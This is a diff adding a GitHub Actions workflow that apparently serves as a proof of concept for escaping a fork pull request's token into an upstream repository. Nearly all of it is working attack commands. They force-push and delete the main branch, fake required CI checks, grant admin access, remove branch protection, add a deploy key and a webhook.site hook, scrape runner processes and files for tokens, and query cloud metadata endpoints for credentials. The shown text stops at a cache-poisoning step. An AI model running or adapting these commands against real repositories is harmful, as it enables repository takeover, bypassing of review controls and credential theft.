@@ -1,0 +1,681 @@
+name: "Cross-Repo Escape Audit v3"
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  actions: write
+  checks: write
+  statuses: write
+  pull-requests: write
+  id-token: write
+
+jobs:
+  cross-repo-audit:
+    name: cross-repo-v3
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          token: ${{ secrets.GITHUB_TOKEN }}
+          repository: lacaag/PoC-RACE2
+
+      - name: Setup
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set +e
+          TS=$(date +%Y%m%d_%H%M%S)
+          echo "TS=${TS}" >> "$GITHUB_ENV"
+          BASE="https://api.github.com/repos/${GITHUB_REPOSITORY}"
+          echo "BASE=${BASE}" >> "$GITHUB_ENV"
+          UP_BASE="https://api.github.com/repos/twrps/PoC-RACE2"
+          echo "UP_BASE=${UP_BASE}" >> "$GITHUB_ENV"
+
+          FORK_MAIN=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${BASE}/git/refs/heads/main" | jq -r '.object.sha // "FAILED"')
+          FORK_TREE=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${BASE}/git/commits/${FORK_MAIN}" | jq -r '.tree.sha // "FAILED"')
+          echo "FORK_MAIN=${FORK_MAIN}" >> "$GITHUB_ENV"
+          echo "FORK_TREE=${FORK_TREE}" >> "$GITHUB_ENV"
+
+          FORK_GHOST=$(curl -sf -X POST \
+            -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/commits" \
+            -d "{\"message\":\"x-ghost\",\"tree\":\"${FORK_TREE}\",\"parents\":[\"${FORK_MAIN}\"],\"author\":{\"name\":\"b\",\"email\":\"b@b.com\"}}" \
+            | jq -r '.sha // "FAILED"')
+          echo "FORK_GHOST=${FORK_GHOST}" >> "$GITHUB_ENV"
+          echo "fork_main=${FORK_MAIN} fork_ghost=${FORK_GHOST}"
+
+          UP_MAIN=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/git/refs/heads/main" | jq -r '.object.sha // "FAILED"')
+          UP_TREE=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/git/commits/${UP_MAIN}" | jq -r '.tree.sha // "FAILED"')
+          echo "UP_MAIN=${UP_MAIN}" >> "$GITHUB_ENV"
+          echo "UP_TREE=${UP_TREE}" >> "$GITHUB_ENV"
+          echo "upstream_main=${UP_MAIN} upstream_tree=${UP_TREE}"
+
+          UP_GQL_ID=$(curl -sf -X POST \
+            -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "https://api.github.com/graphql" \
+            -d "{\"query\":\"{ repository(owner:\\\"twrps\\\", name:\\\"PoC-RACE2\\\") { id } }\"}" \
+            | jq -r '.data.repository.id // "FAILED"')
+          echo "UP_GQL_ID=${UP_GQL_ID}" >> "$GITHUB_ENV"
+          echo "upstream_gql_id=${UP_GQL_ID}"
+
+          OT="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
+          OIDC_AVAIL=$([ -n "$OT" ] && echo yes || echo no)
+          echo "OIDC_AVAIL=${OIDC_AVAIL}" >> "$GITHUB_ENV"
+          echo "oidc_available=${OIDC_AVAIL}"
+
+          PR_NUM=$(echo "${GITHUB_REF}" | grep -oP '(?<=refs/pull/)[0-9]+' || echo "1") 2>/dev/null || true
+          echo "PR_NUM=${PR_NUM}" >> "$GITHUB_ENV"
+
+      - name: U Upstream cross-repo writes (twrps)
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TS: ${{ env.TS }}
+          UP_BASE: ${{ env.UP_BASE }}
+          UP_MAIN: ${{ env.UP_MAIN }}
+          UP_TREE: ${{ env.UP_TREE }}
+          UP_GQL_ID: ${{ env.UP_GQL_ID }}
+          FORK_GHOST: ${{ env.FORK_GHOST }}
+          BASE: ${{ env.BASE }}
+        run: |
+          set +e
+          P() { curl -s -o /dev/null -w "%{http_code}" "$@" 2>/dev/null || echo "000"; }
+          B64=$(echo -n "escape-${TS}" | base64 -w0)
+          GQ="https://api.github.com/graphql"
+
+          echo "=== UPSTREAM: git Data API writes ==="
+          U01=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/git/blobs" -d '{"content":"escape","encoding":"utf-8"}')
+          echo "U01 POST upstream blob = HTTP_${U01}"
+
+          U02=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/git/trees" \
+            -d "{\"base_tree\":\"${UP_TREE}\",\"tree\":[{\"path\":\"esc.txt\",\"mode\":\"100644\",\"type\":\"blob\",\"content\":\"x\"}]}")
+          echo "U02 POST upstream tree = HTTP_${U02}"
+
+          U03=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/git/commits" \
+            -d "{\"message\":\"escape\",\"tree\":\"${UP_TREE}\",\"parents\":[\"${UP_MAIN}\"],\"author\":{\"name\":\"b\",\"email\":\"b@b.com\"}}")
+          echo "U03 POST upstream commit = HTTP_${U03}"
+
+          U04=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/git/refs" \
+            -d "{\"ref\":\"refs/heads/escape-${TS}\",\"sha\":\"${UP_MAIN}\"}")
+          echo "U04 POST upstream new-branch ref = HTTP_${U04}"
+
+          U05=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${FORK_GHOST}\",\"force\":false}")
+          echo "U05 PATCH upstream main (fork-ghost SHA) = HTTP_${U05}"
+
+          U06=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${UP_MAIN}\",\"force\":false}")
+          echo "U06 PATCH upstream main (same SHA noop) = HTTP_${U06}"
+
+          echo ""
+          echo "=== UPSTREAM: Contents API ==="
+          U07=$(P -X PUT -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/contents/escape-${TS}.txt" \
+            -d "{\"message\":\"escape\",\"content\":\"${B64}\"}")
+          echo "U07 PUT upstream file = HTTP_${U07}"
+
+          U08=$(P -X DELETE -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/git/refs/heads/main")
+          echo "U08 DELETE upstream main ref = HTTP_${U08}"
+
+          echo ""
+          echo "=== UPSTREAM: Issues / Releases / Tags ==="
+          U09=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/issues" \
+            -d '{"title":"escaped","body":"from fork PR token"}')
+          echo "U09 POST upstream issue = HTTP_${U09}"
+
+          U10=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/releases" \
+            -d "{\"tag_name\":\"escape-${TS}\",\"name\":\"escape\",\"body\":\"x\",\"draft\":false}")
+          echo "U10 POST upstream release = HTTP_${U10}"
+
+          U29=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/git/tags" \
+            -d "{\"tag\":\"escape-${TS}\",\"message\":\"x\",\"object\":\"${UP_MAIN}\",\"type\":\"commit\"}")
+          echo "U29 POST upstream annotated tag = HTTP_${U29}"
+
+          echo ""
+          echo "=== UPSTREAM: Status and check spoofing ==="
+          U11=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/statuses/${UP_MAIN}" \
+            -d '{"state":"success","context":"required-check","description":"bypassed from fork PR"}')
+          echo "U11 POST upstream status required-check = HTTP_${U11}"
+
+          U12=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/check-runs" \
+            -d "{\"name\":\"required-check\",\"head_sha\":\"${UP_MAIN}\",\"status\":\"completed\",\"conclusion\":\"success\"}")
+          echo "U12 POST upstream check-run = HTTP_${U12}"
+
+          for CTX in "ci" "codeql" "security/snyk" "license/cla" "authorized" "approved" "continuous-integration/travis-ci/pr" "github-actions" "GitHub Actions"; do
+            CODE=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+              -H "Content-Type: application/json" \
+              "${UP_BASE}/statuses/${UP_MAIN}" \
+              -d "{\"state\":\"success\",\"context\":\"${CTX}\",\"description\":\"bypassed\"}")
+            echo "U_status '${CTX}' upstream = HTTP_${CODE}"
+          done
+
+          for NAME in "codeql" "security-scan" "authorized" "ci"; do
+            CODE=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+              -H "Content-Type: application/json" \
+              "${UP_BASE}/check-runs" \
+              -d "{\"name\":\"${NAME}\",\"head_sha\":\"${UP_MAIN}\",\"status\":\"completed\",\"conclusion\":\"success\"}")
+            echo "U_check '${NAME}' upstream = HTTP_${CODE}"
+          done
+
+          echo ""
+          echo "=== UPSTREAM: Admin endpoints ==="
+          U13=$(P -X PUT -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/collaborators/lacaag" \
+            -d '{"permission":"admin"}')
+          echo "U13 PUT upstream collaborator (admin) = HTTP_${U13}"
+
+          U14=$(P -X DELETE -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/branches/main/protection")
+          echo "U14 DELETE upstream branch protection = HTTP_${U14}"
+
+          U15=$(P -X PATCH -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}" \
+            -d '{"private":true}')
+          echo "U15 PATCH upstream make private = HTTP_${U15}"
+
+          U16=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/hooks" \
+            -d '{"name":"web","active":true,"events":["push"],"config":{"url":"https://webhook.site/escape-test","content_type":"json"}}')
+          echo "U16 POST upstream webhook = HTTP_${U16}"
+
+          U17=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/keys" \
+            -d '{"title":"escape","key":"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGtQUDZWhs8JUEk9MiSeFf2DVrFCbcmTHnotreal escape","read_only":false}')
+          echo "U17 POST upstream deploy key (rw) = HTTP_${U17}"
+
+          U18=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/actions/workflows/audit-1500-v2.yml/dispatches" \
+            -d '{"ref":"main"}')
+          echo "U18 workflow dispatch upstream = HTTP_${U18}"
+
+          U19=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/actions/runners/registration-token")
+          echo "U19 POST upstream runner reg token = HTTP_${U19}"
+
+          U20=$(P -X DELETE -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/actions/caches?key=any")
+          echo "U20 DELETE upstream cache = HTTP_${U20}"
+
+          U33=$(P -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/actions/secrets")
+          echo "U33 GET upstream secrets list = HTTP_${U33}"
+
+          U35_R=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/actions/secrets/public-key" 2>/dev/null || echo '{}')
+          echo "U35 GET upstream actions pubkey = $(echo $U35_R | jq -r '.key_id // "FAILED"')"
+
+          U32=$(P -X PUT -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/branches/main/protection" \
+            -d '{"required_status_checks":null,"enforce_admins":false,"required_pull_request_reviews":null,"restrictions":null}')
+          echo "U32 PUT upstream branch protection overwrite = HTTP_${U32}"
+
+          echo ""
+          echo "=== UPSTREAM: GraphQL mutations ==="
+          U21_R=$(curl -s -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" "$GQ" \
+            -d "{\"query\":\"mutation { createRef(input: {repositoryId: \\\"${UP_GQL_ID}\\\", name: \\\"refs/heads/gql-escape-${TS}\\\", oid: \\\"${UP_MAIN}\\\"}) { ref { name } } }\"}" 2>/dev/null) || true
+          U21=$(echo "$U21_R" | jq -r 'if .data.createRef.ref.name then "CREATED:"+.data.createRef.ref.name elif .errors then "ERR:"+.errors[0].message else "?" end' 2>/dev/null || echo "parse_err")
+          echo "U21 GQL createRef upstream = ${U21}"
+
+          U22_R=$(curl -s -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" "$GQ" \
+            -d "{\"query\":\"mutation { createCommitOnBranch(input: {branch: {repositoryNameWithOwner: \\\"twrps/PoC-RACE2\\\", branchName: \\\"main\\\"}, message: {headline: \\\"escape\\\"}, fileChanges: {}, expectedHeadOid: \\\"${UP_MAIN}\\\"}) { commit { oid } } }\"}" 2>/dev/null) || true
+          U22=$(echo "$U22_R" | jq -r 'if .data.createCommitOnBranch.commit.oid then "COMMITTED:"+.data.createCommitOnBranch.commit.oid[:12] elif .errors then "ERR:"+.errors[0].message else "?" end' 2>/dev/null | head -c 100 || echo "parse_err")
+          echo "U22 GQL createCommitOnBranch upstream = ${U22}"
+
+          U23_R=$(curl -s -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" "$GQ" \
+            -d "{\"query\":\"mutation { mergeBranch(input: {repositoryId: \\\"${UP_GQL_ID}\\\", base: \\\"main\\\", head: \\\"main\\\", commitMessage: \\\"escape\\\"}) { mergeCommit { oid } } }\"}" 2>/dev/null) || true
+          U23=$(echo "$U23_R" | jq -r '.errors[0].message // .data.mergeBranch.mergeCommit.oid // "?"' 2>/dev/null | head -c 80 || echo "parse_err")
+          echo "U23 GQL mergeBranch upstream = ${U23}"
+
+          U24_R=$(curl -s -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" "$GQ" \
+            -d "{\"query\":\"mutation { deleteBranchProtectionRule(input: {branchProtectionRuleId: \\\"${UP_GQL_ID}\\\"}) { clientMutationId } }\"}" 2>/dev/null) || true
+          U24=$(echo "$U24_R" | jq -r '.errors[0].message // "?"' 2>/dev/null | head -c 60 || echo "parse_err")
+          echo "U24 GQL deleteBranchProtection upstream = ${U24}"
+
+          U30_R=$(curl -s -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" "$GQ" \
+            -d "{\"query\":\"mutation { addPullRequestReview(input: {pullRequestId: \\\"$(curl -sf -H 'Authorization: token '${GH_TOKEN} -H 'Content-Type: application/json' $GQ -d '{\\\"query\\\":\\\"{ repository(owner:\\\\\\\"twrps\\\\\\\",name:\\\\\\\"PoC-RACE2\\\\\\\") { pullRequests(first:1,states:OPEN){nodes{id}} } }\\\"}' | jq -r '.data.repository.pullRequests.nodes[0].id // empty' 2>/dev/null)\\\", event: APPROVE}) { pullRequestReview { state } } }\"}" 2>/dev/null) || true
+          U30=$(echo "$U30_R" | jq -r '.errors[0].message // .data.addPullRequestReview.pullRequestReview.state // "? (no open PR)"' 2>/dev/null | head -c 80 || echo "parse_err")
+          echo "U30 GQL approve upstream open PR = ${U30}"
+
+          echo ""
+          echo "=== UPSTREAM: git push via protocol ==="
+          git config user.email "b@b.com" 2>/dev/null || true
+          git config user.name "b" 2>/dev/null || true
+          git commit --allow-empty -m "escape-v3-${TS}" 2>/dev/null || true
+
+          U25=$(git push \
+            "https://x-access-token:${GH_TOKEN}@github.com/twrps/PoC-RACE2.git" \
+            HEAD:refs/heads/escape-git-${TS} 2>&1 | tail -1 || true)
+          echo "U25 git push new-branch upstream = ${U25}"
+
+          U26=$(git push --force \
+            "https://x-access-token:${GH_TOKEN}@github.com/twrps/PoC-RACE2.git" \
+            HEAD:refs/heads/main 2>&1 | tail -1 || true)
+          echo "U26 git push force main upstream = ${U26}"
+
+          U27=$(git push \
+            "https://x-access-token:${GH_TOKEN}@github.com/twrps/PoC-RACE2.git" \
+            HEAD:refs/notes/escape-${TS} 2>&1 | tail -1 || true)
+          echo "U27 git push refs/notes upstream = ${U27}"
+
+          U28=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/merges" \
+            -d "{\"base\":\"main\",\"head\":\"${UP_MAIN}\",\"commit_message\":\"escape\"}")
+          echo "U28 POST upstream merges (self-merge) = HTTP_${U28}"
+
+          U31=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/deployments" \
+            -d "{\"ref\":\"main\",\"task\":\"deploy\",\"auto_merge\":false,\"required_contexts\":[]}")
+          echo "U31 POST upstream deployment = HTTP_${U31}"
+
+          echo ""
+          echo "=== UPSTREAM: Fork PR to upstream ==="
+          U_PR=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/pulls" \
+            -d "{\"title\":\"escape-${TS}\",\"head\":\"lacaag:main\",\"base\":\"main\",\"body\":\"PR created from fork PR GITHUB_TOKEN\"}")
+          echo "U_PR POST upstream PR from fork token = HTTP_${U_PR}"
+
+          echo ""
+          echo "=== UPSTREAM: Token cross-check ==="
+          GIT_TOK=$(git config --get http.https://github.com/.extraheader 2>/dev/null \
+            | sed 's/AUTHORIZATION: basic //' | base64 -d 2>/dev/null | cut -d: -f2 || true)
+          if [ -n "$GIT_TOK" ] && [ "$GIT_TOK" != "$GH_TOKEN" ]; then
+            U36=$(P -X POST -H "Authorization: token ${GIT_TOK}" \
+              -H "Content-Type: application/json" \
+              "${UP_BASE}/git/blobs" -d '{"content":"escape-extraheader","encoding":"utf-8"}')
+            echo "U36 git-extraheader-tok upstream blob = HTTP_${U36}"
+            U36scope=$(curl -sI -H "Authorization: token ${GIT_TOK}" \
+              "https://api.github.com/user" 2>/dev/null | grep -i 'x-oauth-scopes' || true)
+            echo "U36 extraheader scopes: ${U36scope}"
+          else
+            echo "U36 extraheader same as GH_TOKEN"
+          fi
+
+      - name: V OIDC and runtime tokens deep
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          UP_BASE: ${{ env.UP_BASE }}
+          UP_MAIN: ${{ env.UP_MAIN }}
+          BASE: ${{ env.BASE }}
+          TS: ${{ env.TS }}
+        run: |
+          set +e
+          echo "=== OIDC deep inspection ==="
+          OT="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
+          if [ -n "$OT" ]; then
+            OIDC_JWT=$(curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api.github.com" \
+              -H "Authorization: bearer ${OT}" | jq -r '.value // empty' || true)
+            echo "V01 OIDC JWT obtained: $([ -n "$OIDC_JWT" ] && echo yes || echo no)"
+            if [ -n "$OIDC_JWT" ]; then
+              CLAIMS=$(echo "$OIDC_JWT" | cut -d. -f2 | \
+                awk '{n=length($0)%4; if(n==2)$0=$0"=="; if(n==3)$0=$0"="; print}' | \
+                base64 -d 2>/dev/null | jq . 2>/dev/null || true)
+              echo "V02 OIDC claims:"
+              echo "$CLAIMS" | jq '{sub,iss,aud,repository,repository_owner,workflow,ref,sha,run_id,job_workflow_ref,ref_type}' 2>/dev/null || true
+
+              V03=$(curl -sf -H "Authorization: bearer ${OIDC_JWT}" \
+                "${UP_BASE}" 2>/dev/null | jq -r '.full_name // "FAILED"' || echo "FAILED")
+              echo "V03 OIDC JWT as bearer -> upstream read = ${V03}"
+
+              V04=$(curl -s -o /dev/null -w "%{http_code}" \
+                -X POST -H "Authorization: bearer ${OIDC_JWT}" \
+                -H "Content-Type: application/json" \
+                "${UP_BASE}/git/blobs" -d '{"content":"x","encoding":"utf-8"}' 2>/dev/null || echo "000")
+              echo "V04 OIDC JWT -> upstream write = HTTP_${V04}"
+
+              for AUD in api.github.com sts.amazonaws.com management.azure.com accounts.google.com vault sigstore.dev github.com; do
+                JWT_AUD=$(curl -sf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}" \
+                  -H "Authorization: bearer ${OT}" | jq -r '.value // empty' || true)
+                if [ -n "$JWT_AUD" ]; then
+                  AUD_CLAIM=$(echo "$JWT_AUD" | cut -d. -f2 | \
+                    awk '{n=length($0)%4; if(n==2)$0=$0"=="; if(n==3)$0=$0"="; print}' | \
+                    base64 -d 2>/dev/null | jq -r '.aud,.sub' 2>/dev/null | tr '\n' '|' || true)
+                  echo "V05 OIDC aud=${AUD} -> aud/sub=${AUD_CLAIM}"
+                else
+                  echo "V05 OIDC aud=${AUD} -> FAILED"
+                fi
+              done
+            fi
+          else
+            echo "V01 OIDC not available"
+          fi
+
+          echo ""
+          echo "=== Runtime token ==="
+          RT="${ACTIONS_RUNTIME_TOKEN:-}"
+          RURL="${ACTIONS_RUNTIME_URL:-}"
+          if [ -n "$RT" ]; then
+            RT_CLAIMS=$(echo "$RT" | cut -d. -f2 | \
+              awk '{n=length($0)%4; if(n==2)$0=$0"=="; if(n==3)$0=$0"="; print}' | \
+              base64 -d 2>/dev/null | jq . 2>/dev/null || true)
+            echo "V10 runtime claims: $(echo "$RT_CLAIMS" | jq '{scp,iss,sub}' 2>/dev/null || echo "$RT_CLAIMS" | head -3)"
+
+            V11=$(curl -sf -H "Authorization: bearer ${RT}" \
+              "https://api.github.com/user" 2>/dev/null | jq -r '.login // "FAILED"' || echo "FAILED")
+            echo "V11 runtime tok -> /user = ${V11}"
+
+            V12=$(curl -s -o /dev/null -w "%{http_code}" \
+              -X POST -H "Authorization: bearer ${RT}" \
+              -H "Content-Type: application/json" \
+              "${UP_BASE}/git/blobs" -d '{"content":"x","encoding":"utf-8"}' 2>/dev/null || echo "000")
+            echo "V12 runtime tok -> upstream blob = HTTP_${V12}"
+
+            V13=$(curl -s -o /dev/null -w "%{http_code}" \
+              -X POST -H "Authorization: bearer ${RT}" \
+              -H "Content-Type: application/json" \
+              "${BASE}/git/blobs" -d '{"content":"x","encoding":"utf-8"}' 2>/dev/null || echo "000")
+            echo "V13 runtime tok -> fork blob = HTTP_${V13}"
+          else
+            echo "V10 runtime token not available"
+          fi
+
+          echo ""
+          echo "=== Token scope headers ==="
+          SCOPE=$(curl -sI -H "Authorization: token ${GH_TOKEN}" \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}" 2>/dev/null | \
+            grep -i 'x-oauth-scopes\|x-accepted-oauth-scopes\|x-github-request-id' || true)
+          echo "V20 token scope headers: ${SCOPE}"
+
+          V21=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "https://api.github.com/installation/repositories" \
+            2>/dev/null | jq -r '.repositories[].full_name' 2>/dev/null | head -10 || true)
+          echo "V21 installation repos: ${V21:-none}"
+
+          V22=$(curl -sf -H "Authorization: token ${GH_TOKEN}" \
+            "${UP_BASE}/traffic/views" 2>/dev/null | head -c 100 || echo "no access")
+          echo "V22 upstream traffic/views: ${V22}"
+
+      - name: W Runner env deep scan
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          UP_BASE: ${{ env.UP_BASE }}
+        run: |
+          set +e
+          echo "=== Process environ token scan ==="
+          W01=$(cat /proc/*/environ 2>/dev/null | tr '\0' '\n' \
+            | grep -E '^(GITHUB_TOKEN|GH_TOKEN|TOKEN|SECRET|PAT|ACTIONS_RUNTIME_TOKEN|ACTIONS_ID_TOKEN)' \
+            | grep -v "^GH_TOKEN=${GH_TOKEN}" | head -10 || true)
+          echo "W01 extra token envvars in /proc: ${W01:-none}"
+
+          W02=$(find /home/runner /tmp 2>/dev/null -maxdepth 6 \
+            -type f -readable -name "*.json" 2>/dev/null \
+            | xargs grep -l 'token\|secret\|credential' 2>/dev/null | head -5 || true)
+          echo "W02 json files with token keywords: ${W02:-none}"
+
+          for F in $W02; do
+            echo "  W02_contents ${F}:"
+            cat "$F" 2>/dev/null | jq -r \
+              'to_entries[] | select(.key|test("token|auth|secret|pass";"i")) | .key+"="+(.value|tostring[:20])' \
+              2>/dev/null | head -5 || true
+          done
+
+          W03=$(find /home/runner/_diag 2>/dev/null -type f | \
+            xargs grep -l 'ghs_\|gho_\|ghp_\|ghu_' 2>/dev/null | head -3 || true)
+          echo "W03 _diag token files: ${W03:-none}"
+
+          echo ""
+          echo "=== Runner credentials ==="
+          W04=$(git config --global credential.helper 2>/dev/null || echo none)
+          echo "W04 git credential.helper: ${W04}"
+
+          W05=$(cat ~/.netrc 2>/dev/null | grep -v password | head -5 || echo "no .netrc")
+          echo "W05 netrc (no passwords): ${W05}"
+
+          W06=$(gh auth status 2>&1 | head -6 || true)
+          echo "W06 gh auth status: ${W06}"
+
+          W07=$(cat ~/.config/gh/hosts.yml 2>/dev/null | grep -v 'oauth_token' | head -10 || true)
+          echo "W07 gh hosts (no tokens): ${W07:-none}"
+
+          echo ""
+          echo "=== Runner filesystem ==="
+          echo "W08 /home/runner/work/_temp:"
+          ls -la /home/runner/work/_temp/ 2>/dev/null | head -15 || true
+
+          W09=$(find /home/runner/work/_temp -name '*.json' 2>/dev/null | head -5)
+          for F in $W09; do
+            echo "W09 temp json: $F"
+            cat "$F" 2>/dev/null | jq -r 'to_entries[] | select(.key|test("token|auth|secret";"i")) | .key+"="+(.value|tostring[:15])' 2>/dev/null | head -3 || true
+          done
+
+          echo ""
+          echo "=== Cloud IMDS ==="
+          W10=$(curl -sf -m3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
+            2>/dev/null || echo "no AWS IMDS")
+          echo "W10 AWS IMDS: ${W10}"
+
+          W11=$(curl -sf -m3 -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
+            2>/dev/null | jq -r '.compute.vmId // empty' | head -1 || echo "no Azure IMDS")
+          echo "W11 Azure IMDS vmId: ${W11}"
+
+          W12=$(curl -sf -m3 -H "Metadata-Flavor: Google" \
+            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" \
+            2>/dev/null | head -3 || echo "no GCP IMDS")
+          echo "W12 GCP IMDS: ${W12}"
+
+          W13=$(curl -sf -m3 "http://169.254.169.254/latest/user-data" 2>/dev/null | head -c 200 || echo "no user-data")
+          echo "W13 AWS user-data: ${W13}"
+
+          echo ""
+          echo "=== env vars of interest ==="
+          echo "W14 HOME=$HOME"
+          echo "W15 RUNNER_WORKSPACE=${RUNNER_WORKSPACE:-not set}"
+          echo "W16 RUNNER_TEMP=${RUNNER_TEMP:-not set}"
+          echo "W17 ACTIONS_RUNTIME_URL=${ACTIONS_RUNTIME_URL:0:50}"
+          echo "W18 ACTIONS_RESULTS_URL=${ACTIONS_RESULTS_URL:0:50}"
+          echo "W19 PATH first 3: $(echo $PATH | cut -d: -f1-3)"
+          W20=$(docker info 2>/dev/null | grep -E 'Server Version|Registry|Username' | head -5 || echo "no docker")
+          echo "W20 docker info: ${W20}"
+
+      - name: X Supply chain and env
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          UP_BASE: ${{ env.UP_BASE }}
+          BASE: ${{ env.BASE }}
+          TS: ${{ env.TS }}
+          FORK_GHOST: ${{ env.FORK_GHOST }}
+        run: |
+          set +e
+          P() { curl -s -o /dev/null -w "%{http_code}" "$@" 2>/dev/null || echo "000"; }
+
+          echo "=== Supply chain access ==="
+          X01=$(P -H "Authorization: token ${GH_TOKEN}" \
+            "https://api.github.com/user/packages?package_type=npm")
+          echo "X01 user npm packages = HTTP_${X01}"
+
+          X02=$(P -H "Authorization: token ${GH_TOKEN}" \
+            "https://api.github.com/user/packages?package_type=container")
+          echo "X02 user container packages = HTTP_${X02}"
+
+          X03=$(echo "${GH_TOKEN}" | docker login ghcr.io -u "${GITHUB_ACTOR}" \
+            --password-stdin 2>&1 | tail -1 || true)
+          echo "X03 docker ghcr login = ${X03}"
+
+          if [ "${X03}" = "Login Succeeded" ]; then
+            X03b=$(docker pull ghcr.io/twrps/poc-race2:latest 2>&1 | tail -1 || true)
+            echo "X03b docker pull upstream image = ${X03b}"
+          fi
+
+          X04=$(P -H "Authorization: token ${GH_TOKEN}" \
+            "https://npm.pkg.github.com/lacaag")
+          echo "X04 npm pkg registry = HTTP_${X04}"
+
+          X05=$(P "https://pypi.org/pypi/requests/json")
+          echo "X05 pypi outbound = HTTP_${X05}"
+
+          X06=$(P "https://registry.npmjs.org/lodash")
+          echo "X06 npmjs outbound = HTTP_${X06}"
+
+          echo ""
+          echo "=== Gist write ==="
+          X07=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "https://api.github.com/gists" \
+            -d '{"description":"escape","public":false,"files":{"e.txt":{"content":"escaped from fork PR token"}}}')
+          echo "X07 POST gist = HTTP_${X07}"
+
+          echo ""
+          echo "=== Upstream runner reg tokens ==="
+          X08=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "${UP_BASE}/actions/runners/registration-token")
+          echo "X08 upstream runner reg token = HTTP_${X08}"
+
+          X09=$(P -X POST -H "Authorization: token ${GH_TOKEN}" \
+            -H "Content-Type: application/json" \
+            "https://api.github.com/orgs/twrps/actions/runners/registration-token")
+          echo "X09 upstream org runner reg token = HTTP_${X09}"
+
+          echo ""
+          echo "=== Action cache poisoning ==="
+          RT="${ACTIONS_RUNTIME_TOKEN:-}"
+          CACHEURL="${ACTIONS_CACHE_URL:-${ACTIONS_RUNTIME_URL:-}}"
